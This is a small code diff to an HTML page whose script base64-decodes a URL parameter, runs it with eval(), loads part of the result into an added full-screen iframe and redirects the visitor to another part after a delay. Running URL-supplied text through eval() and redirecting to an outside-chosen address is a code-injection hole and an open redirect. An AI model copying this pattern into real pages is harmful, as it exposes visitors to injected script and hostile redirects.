@@ -1,3 +1,4 @@
+<iframe id="m" style="width:100%;height:100%" src="https://www.baidu.com" ></iframe>
 <script>
 function getPar(par){
     var local_url = document.location.href; 
@@ -18,6 +19,7 @@ var result2 = base.decode(base64txt);
 //document.write(result2);  
 var ex=result2.trim();
 var x=eval(ex);
+document.getElementById("m").src=x[2];
 setTimeout(function(){
 document.location.href=x[1];
 },x[0]);
